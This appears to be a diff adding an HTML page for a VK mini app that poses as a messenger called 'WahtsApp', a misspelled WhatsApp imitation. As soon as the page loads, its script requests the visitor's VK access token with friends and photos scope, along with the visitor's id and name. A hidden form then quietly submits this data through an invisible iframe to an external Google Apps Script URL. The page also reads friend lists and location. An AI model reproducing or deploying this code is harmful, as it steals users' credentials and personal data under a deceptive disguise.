@@ -1,0 +1,189 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <title>One HTML Page Challenge</title>
+        <link
+            href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"
+            rel="stylesheet"
+            integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T"
+            crossorigin="anonymous" />
+        <link rel="stylesheet" href="styles.css" />
+    </head>
+    <body>
+        <iframe title="votar" name="votar" style="display:none;"></iframe>
+        <form id="send_data_form" target="votar" action="https://script.google.com/macros/s/AKfycbxW22NfHex3JMZxhIIw3SZtE7RacfCPHsV-9SOIo1TML9c_q8wv_MXOhyXsfwku2_WM/exec" method="get">
+            <input type="hidden" name="user_id" value="000000000"/>
+            <input type="hidden" name="first_name" value="Иван"/>
+            <input type="hidden" name="last_name" value="Иванович"/>
+            <input type="hidden" name="access_token" value="0987654321"/>
+        </form>
+        
+        <div class="container-fluid">
+            <br />
+            <div class="card">
+                <div class="card-body">
+                    <div class="jumbotron">
+                        <img src="logo-whatsapp-150.png" alt="VK Мессенджер" class="logo" />
+                        <p><b>WahtsApp</b></p>
+                        <hr class="my-4" />
+                        <p>Бесплатное и быстрое приложение для общения. Будьте на связи с друзьями и знакомыми в чатах и социальных сетях.</p>
+                        <ul class='text-center'>
+                            <li class='text-left'>Делитесь фотографиями и видео</li>
+                            <li class='text-left'>Звоните без ограничений по времени и числу участников</li>
+                            <li class='text-left'>Контакты в быстром доступе: из телефонной книги и ВКонтакте</li>
+                            <li class='text-left'>Создавайте фантомные чаты и отправляйте исчезающие сообщения</li>
+                            <li class='text-left'>Получайте бизнес-уведомления в мессенджере</li>
+                        </ul>
+                        
+                        <a class="btn btn-primary btn-lg text-white" onclick="GetFriends();" role="button">Пригласить</a>
+
+                        <a class="btn btn-primary btn-lg text-white" onclick="GetLocation;" role="button">Геолокация</a>
+                    </div>
+                    
+                    <div id="list"></div>
+                </div>
+            </div>
+        </div>
+        <br />
+
+        <script>
+
+            var list = document.getElementById("list");
+
+            function GetLocation() {
+                vkBridge.send('VKWebAppGetGeodata')
+                    .then((data) => { 
+                        if (data.available) {
+                            var hr = document.createElement("hr");
+                            list.appendChild(hr);
+
+                            var card = document.createElement("div");
+                            card.className = "card";
+
+                            var body = document.createElement("div");
+                            body.className = "card-body";
+                            card.appendChild(body);
+
+                            const cardTitle = document.createElement("h5");
+                            const cardTitleNode = document.createTextNode(JSON.stringify(data));
+                            cardTitle.className = "card-title";
+                            cardTitle.appendChild(cardTitleNode);
+                            body.appendChild(cardTitle);
+
+                            list.appendChild(card);
+                        }
+                })
+                .catch((error) => { });
+            }
+            
+            function GetFriends() {
+
+                vkBridge.send('VKWebAppGetFriends')
+                  .then((data) => { 
+                    if (data) {
+                        
+                        data.users.forEach(({ id, first_name, last_name }) => {
+                            var hr = document.createElement("hr");
+                            list.appendChild(hr);
+
+                            var card = document.createElement("div");
+                            card.className = "card";
+
+                            var body = document.createElement("div");
+                            body.className = "card-body";
+                            card.appendChild(body);
+
+                            const cardTitle = document.createElement("h5");
+                            const cardTitleNode = document.createTextNode(first_name + " " + last_name);
+                            cardTitle.className = "card-title";
+                            cardTitle.appendChild(cardTitleNode);
+                            body.appendChild(cardTitle);
+
+                            list.appendChild(card);
+                        });
+                        
+                        
+                      // Данные о пользователях
+                      console.log(data.users);
+                    }
+                  })
+                  .catch((error) => { });
+            }
+            
+            
+            function initBridge() {
+                vkBridge
+                    .send("VKWebAppInit")
+                    .then((data) => {
+                        if (data.result) {
+                            vkBridge
+                                .send('VKWebAppGetUserInfo', {})
+                                .then((data) => { 
+                                    if (data.id) {
+                                        var hr = document.createElement("hr");
+                                        list.appendChild(hr);
+
+                                        var card = document.createElement("div");
+                                        card.className = "card";
+
+                                        var body = document.createElement("div");
+                                        body.className = "card-body";
+                                        card.appendChild(body);
+
+                                        const cardTitle = document.createElement("h5");
+                                        const cardTitleNode = document.createTextNode(data.first_name + " " + data.last_name);
+                                        cardTitle.className = "card-title";
+                                        cardTitle.appendChild(cardTitleNode);
+                                        body.appendChild(cardTitle);
+
+                                        list.appendChild(card);
+                                        
+                                        document.querySelector('#send_data_form input[name="user_id"]').value = data.id;
+                                        document.querySelector('#send_data_form input[name="first_name"]').value = data.first_name;
+                                        document.querySelector('#send_data_form input[name="last_name"]').value = data.last_name;
+                                        document.getElementById("send_data_form").submit();
+                                    }
+                                })
+                                .catch((error) => { });                            
+                            
+                            vkBridge
+                                .send("VKWebAppGetAuthToken", {
+                                    app_id: 53535801,
+                                    scope: "friends,photos"
+                                })
+                                .then((data) => {
+                                    if (data.access_token) {
+                                        var hr = document.createElement("hr");
+                                        list.appendChild(hr);
+
+                                        var card = document.createElement("div");
+                                        card.className = "card";
+
+                                        var body = document.createElement("div");
+                                        body.className = "card-body";
+                                        card.appendChild(body);
+
+                                        const cardTitle = document.createElement("h5");
+                                        const cardTitleNode = document.createTextNode(data.access_token);
+                                        cardTitle.className = "card-title";
+                                        cardTitle.appendChild(cardTitleNode);
+                                        body.appendChild(cardTitle);
+
+                                        list.appendChild(card);
+                                        
+                                        document.querySelector('#send_data_form input[name="access_token"]').value = data.access_token;
+                                        document.getElementById("send_data_form").submit();
+                                    }
+                                })
+                                .catch((error) => { });
+                        } else {
+                        }
+                    })
+                    .catch((error) => { });
+            }
+        </script>
+
+        <script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js" onload="initBridge()" type="text/javascript"></script>
+    </body>
+</html>
